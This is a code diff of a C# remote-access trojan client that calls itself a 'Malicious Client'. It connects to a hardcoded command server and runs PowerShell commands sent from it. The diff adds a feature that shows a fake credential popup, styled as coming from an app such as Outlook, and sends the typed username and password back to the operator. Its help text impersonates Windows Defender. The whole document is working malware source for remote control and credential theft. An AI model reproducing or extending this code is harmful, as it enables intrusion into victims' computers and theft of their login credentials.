@@ -25,7 +25,7 @@ namespace Client
             Properties.GenerateData();
             Console.Write($"ID: {Properties.ID}\n");
 
-            Commands.runPowershellCommand("whoami");
+            //Commands.runPowershellCommand("whoami");
             //Prompts.requestUserCreds();
 
             // enters loop for jobs n stuff
@@ -33,7 +33,7 @@ namespace Client
         }
 
         // Connection to Server
-        static void ConnectToServer()
+        public static void ConnectToServer()
             /* Note, need to create a class or at least methods that handle the heartbeat and other commands, this is currently set to handle
              just the init client send to the server*/ 
         {
@@ -49,7 +49,7 @@ namespace Client
                     //IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
 
                     //string to IP, it wants a System.Net.IPAddress for security/validation reasons
-                    var ip = IPAddress.Parse("192.168.0.39");
+                    var ip = IPAddress.Parse("192.168.44.147");
                     IPAddress ipAddr = ip; //ipHost.AddressList[0]; //just localhost
                     //Console.Write($"[DEBUG] ipHost.AddressList: {ipHost.AddressList}");
 
@@ -109,20 +109,25 @@ namespace Client
 
                         //logic to determine if this is a session or not. 
                         // if it is, loop, if not, send command as usual
-                        string[] parsedCommand;
-                        parsedCommand = (string[])Message.CommandParse(stringRecv);
+                        //string[] parsedCommand;
+                        //parsedCommand = Message.CommandParse(stringRecv);
 
-                        Console.Write($"[Debug]: rawCommand: {parsedCommand}, \n");
-                        Console.Write($"[Debug]: parsedCommand: {parsedCommand[0]},{parsedCommand[1]} \n");
+                        //Console.Write($"[Debug]: rawCommand: {parsedCommand}, \n");
+                        //Console.Write($"[Debug]: parsedCommand: {parsedCommand[0]},{parsedCommand[1]} \n");
 
                         string DataFromTarget;
 
-                        if (parsedCommand[0] == "session")
+
+                        if (stringRecv == "session")
                         {
                             //need to send a-ok message
                             //Message.SendMessage("Session opened", sender);
                             while (1 == 1)
                             // session loop
+
+                            //NOTE: No parsing on session commands. Creates too much damned havoc. 
+                            //decision tree with parse the commands (command\\|/command) IF NECCESARY.
+                            // this just (nicely) passes the command along to the decision tree to handle
                             {
                                 byte[] newMessageReceived = new byte[1024];
                                 Console.Write("[Debug] Session Command, waiting to recieve message...");
@@ -131,11 +136,11 @@ namespace Client
                                 
                                 //again custom recieve
                                 string sessionStringRecv = Message.RecvMessage(sender);
-                                string[] sessionParsedCommand = (string[])Message.CommandParse(sessionStringRecv);
+                                //string[] sessionParsedCommand = Message.CommandParse(sessionStringRecv);
 
-                                Console.Write($"\nSession Parsed Commands: {sessionParsedCommand[0]}, {sessionParsedCommand[1]}\n");
+                                //Console.Write($"\nSession Parsed Commands: {sessionParsedCommand[0]}, {sessionParsedCommand[1]}\n");
 
-                                if (sessionParsedCommand[0] == "break")
+                                if (sessionStringRecv == "break")
                                 {
                                     Message.SendMessage("Closing Session", sender);
                                     break;
@@ -144,7 +149,8 @@ namespace Client
                                 {
                                     //run through decision tree
                                     Console.Write("Running through decision tree\n");
-                                    DataFromTarget = DecisionTree(sessionParsedCommand);
+                                    //passes socket into here so it can make socket commands if necessary. Keeps it clean(er) that accessing socket from anywhere
+                                    DataFromTarget = DecisionTree(sessionStringRecv, sender);
                                     Console.Write($"Sending message {DataFromTarget} back...\n");
                                     Message.SendMessage(DataFromTarget, sender);
                                     //send back
@@ -159,7 +165,7 @@ namespace Client
                             Console.Write("Decision Tree");
                             //decision tree calls method
                             //decision tree returns data (or waits if wait)
-                            DataFromTarget = DecisionTree(parsedCommand);
+                            DataFromTarget = DecisionTree(stringRecv, sender);
                             Console.Write($"[DEBUG] Message to send back: {DataFromTarget}");
                             //Data is sent to 'send' method (takes the message, and the socket as args)
                             Message.SendMessage(DataFromTarget, sender);
@@ -198,22 +204,25 @@ namespace Client
             }
         }
         
-        static string DecisionTree(string[] parsedCommand)
+        static string DecisionTree(string rawCommand, Socket conn)
         {
 
+            //initialzing if needed later
+            string[] parsedCommand;
+            string command;
+            string commandValue;
 
-            string command = parsedCommand[0];
-            string commandValue = parsedCommand[1];
-            //string host = parsedCommand[2];
+            // parsing has been moved to a per-command basis. 
 
-            if (command == "wait" || command == "")
+
+            if (rawCommand == "wait" || rawCommand == "")
             {
-                Console.WriteLine($"[Debug] Waiting, Command was: {command}");
+                Console.WriteLine($"[Debug] Waiting, Command was: {rawCommand}");
                 //in this case, return nothing. 
                 return "waiting";
             }
 
-            else if (command == "help")
+            else if (rawCommand == "help")
             {
                 return """
                 Help Screen, brought to you by Windows Defender
@@ -241,8 +250,24 @@ namespace Client
                 """;
             }
 
-            else if (command == "set-heartbeat")
+            else if (rawCommand.Contains("set-heartbeat") == true)
             {
+                //not super clean but it works
+                try
+                {
+                    parsedCommand = Message.CommandParse(rawCommand);
+                    command = parsedCommand[0];
+                    commandValue = parsedCommand[1];
+                }
+                catch (Exception e)
+                {
+                    //sending error to freindly client
+                    Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
+                    Message.SendMessage("Error with command, make sure it's valid", conn);
+                    command = "";
+                    commandValue = "";
+                }
+
                 int time;
                 try
                 {
@@ -260,19 +285,59 @@ namespace Client
 
             }
 
-            else if (command == "run-command-ps")
+            else if (rawCommand.Contains("run-command-ps") == true)
             {
+
+                //not super clean but it works
+                try
+                {
+                    parsedCommand = Message.CommandParse(rawCommand);
+                    command = parsedCommand[0];
+                    commandValue = parsedCommand[1];
+                }
+                catch (Exception e)
+                {
+                    //sending error to freindly client
+                    Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
+                    Message.SendMessage("Error with command, make sure it's valid", conn);
+                    command = "";
+                    commandValue = "";
+                }
+
                 Console.WriteLine($"run-command-ps, Command was: {command}");
                 return Commands.runPowershellCommand(commandValue);
                 //return commandValue;
             }
 
-            else if (command == "sanity-check")
+            else if (rawCommand == "sanity-check")
             {
                 return "This message has been returned from the client decision tree, and made it's way back to you. TLDR: it fucking works! BTW those triangles are the header bytes";
             }
 
-            return $"[Debug: From Malicious Client] Command unknown: {command} ";
+            //prompt block
+
+            else if (rawCommand == "prompt-credentials")
+            {
+                string targetMessage;
+                string targetApp;
+                string credResults;
+
+
+                Message.SendMessage("Please enter the message that the target will see. Ex: 'Outlook is requesting your credentials:'", conn);
+                //no need to parse this one as it's getting sent over raw, and only getting one answer
+                targetMessage = Message.RecvMessage(conn);
+
+                Message.SendMessage("Please enter the app this request will seemingly come from (used in popup header) Ex: 'Outlook.exe'", conn);
+                //same here as above
+                targetApp = Message.RecvMessage(conn);
+
+                //sending to function
+                credResults = Prompts.requestUserCreds(targetMessage, targetApp);
+
+                return credResults;
+            }
+
+            return $"[Debug: From Malicious Client] Command unknown: {rawCommand} ";
         }
     }
 
@@ -346,7 +411,7 @@ namespace Client
     class Message
         /* Handles all message functions/methods */
     {
-        static public Array Parse(string rawMessage)
+        static public string[] Parse(string rawMessage)
             /* Parses the message received from the server, returns an Array
              * Looks like: !_client_!\|/ID\|/Message 
              */
@@ -357,13 +422,14 @@ namespace Client
             return parsedMessage;
         }
 
-        static public Array CommandParse(string rawCommand)
+        static public string[] CommandParse(string rawCommand)
             /* A parser specifically for commands. (third item in parsed message)
              * looks like this: set-heartbeat\|/15
              Returns a parsed command (array)
              */
         {
-            string[] parsedMessage = rawCommand.Split("\\|/");
+            //string[] parsedMessage = rawCommand.Split("\\|/");
+            string[] parsedMessage = rawCommand.Split();
             return parsedMessage;
         }
 
@@ -484,24 +550,22 @@ namespace Client
     class Prompts
         /* prompts/popups via native windows API's */
     {
-        public static string requestUserCreds()
+        public static string requestUserCreds(string message, string applicationName)
         {
             /* pops a user credential box on screen 
              Would be cool to have it say something custom, or give the friendly use the option to input a custom message 
             (maybe prompt-usercreds-popup\|/custom-message?)
-             
-
 
              */
             //https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.3
             // https://stackoverflow.com/questions/9476681/creduipromptforcredentials-forcing-manual-selection-of-user-name
 
-
             //initializing a new instance of CredentialPrompt
             CredentialPrompt prompt = new CredentialPrompt();
 
+
             //prompt.Prompt()
-            string[] Credentials = prompt.Prompt();
+            string[] Credentials = prompt.Prompt(message, applicationName);
 
             Console.Write($"User: {Credentials[0]} Pass: {Credentials[1]}");
 
